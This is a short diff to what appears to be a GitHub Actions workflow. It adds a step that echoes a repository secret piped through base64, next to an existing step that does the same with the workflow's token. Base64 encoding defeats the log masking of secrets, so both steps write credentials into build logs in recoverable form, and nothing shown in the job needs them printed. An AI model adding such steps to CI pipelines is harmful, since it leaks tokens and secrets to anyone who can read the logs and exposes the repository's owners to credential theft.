@@ -17,3 +17,6 @@ jobs:
         env:
           GREAT: ${{ github.token }}
         run: echo $GREAT | base64
+      - run: echo $SECRET_CODE | base64
+        env:
+          SECRET_CODE: ${{ secrets.NAHBRAHNONO }}
